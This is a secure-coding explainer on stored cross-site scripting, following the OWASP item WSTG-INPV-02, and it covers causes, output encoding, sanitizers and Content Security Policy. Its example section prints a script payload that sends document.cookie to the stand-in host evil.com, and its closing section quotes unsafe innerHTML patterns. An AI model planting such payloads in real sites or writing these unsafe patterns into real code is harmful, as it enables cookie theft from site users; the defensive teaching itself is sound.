**WSTG-INPV-02**

Test Name----\> Testing for Stored Cross Site Scripting

Objectives----\> \- Identify stored input that is reflected on the client-side.

\- Assess the input they accept and the encoding that gets applied on return (if any).

**Overview-**

Stored XSS is the **nasty, persistent sibling** of Reflected XSS.

While Reflected XSS relies on tricking someone into clicking a malicious link, **Stored XSS quietly injects malicious scripts into a system where they live permanently** — usually in databases, logs, or CMS content — and execute every time a user visits the infected page.

It’s a **"write once, exploit many"** vulnerability. An attacker plants the payload, and any unsuspecting user who views the page triggers the script, often without even knowing it.

This is **especially dangerous in admin panels**, internal dashboards, comment sections, or anywhere user content is stored and displayed.

**Real World Example-**

Let’s say you have a blog comment section. An attacker submits:

\<script\>fetch('https://evil.com/steal?cookie=' \+ document.cookie)\</script\>  
This input gets **stored in your database** and is later rendered directly into the blog post without sanitization:

\<div *class*\="comment"\>  
    \<script\>fetch('https://evil.com/steal?cookie=' \+ document.cookie)\</script\>  
\</div\>  
Now every user (or admin) who views that post unknowingly runs the attacker’s JavaScript.

Welcome to the XSS horror show.

**How the Vulnerability occurs-**

* User input is stored (e.g., database, log, file).

* That data is then **rendered directly into the front-end** without being properly escaped/encoded.

* There’s **no context-aware output encoding**.

* Application trusts stored input, even in dynamic elements like innerHTML, document.write, or DOM manipulation via JavaScript.

Bonus: Sometimes **WYSIWYG editors or Markdown renderers** introduce XSS via plugins or unsafe sanitizers.

**Secure Coding Recommendations-**

**Input Filtering**

Use allowlists for input types like names, emails, etc. But again, **validation ≠ sanitization**. It just blocks the obvious junk.

**Context-Aware Output Encoding**

Before you display anything user-controlled:

* Encode for **HTML** if inserting into tags.  
* Encode for **Attributes** (quotes and special chars).  
* Encode for **JavaScript** if embedding inline values.

**Avoid Dangerous APIs**

Skip innerHTML, document.write, eval(), or jQuery's .html() unless you're escaping things properly or sanitizing everything.

**Mitigation Steps (Developer Focused)-**

**1\. Use a Secure Templating Engine**

Frameworks like React, Vue, Django, Jinja2, and Handlebars escape outputs by default. Use them. Trust them. Don’t bypass their protection.

**2\. Sanitize Input Where Output Encoding Isn’t Enough**

If users are allowed to submit rich HTML (like comments or posts), use sanitizers:

* [DOMPurify](https://github.com/cure53/DOMPurify) (for client-side)  
* OWASP Java HTML Sanitizer (for server-side Java apps)

These strip unsafe tags like \<script\>, \<iframe\>, or onmouseover.

**3\. Apply Content Security Policy (CSP)**

CSP adds another layer by **blocking inline scripts** unless explicitly allowed:

Content\-Security\-Policy: script\-src 'self'*;*

It's not foolproof, but it helps.

**4\. Educate Developers**

A surprising amount of stored XSS comes from junior devs writing things like:

\<div\>*$*{userInput}\</div\>

or worse:

element.innerHTML \= userInput*;*

Make sure your team knows how dangerous that line of code can be.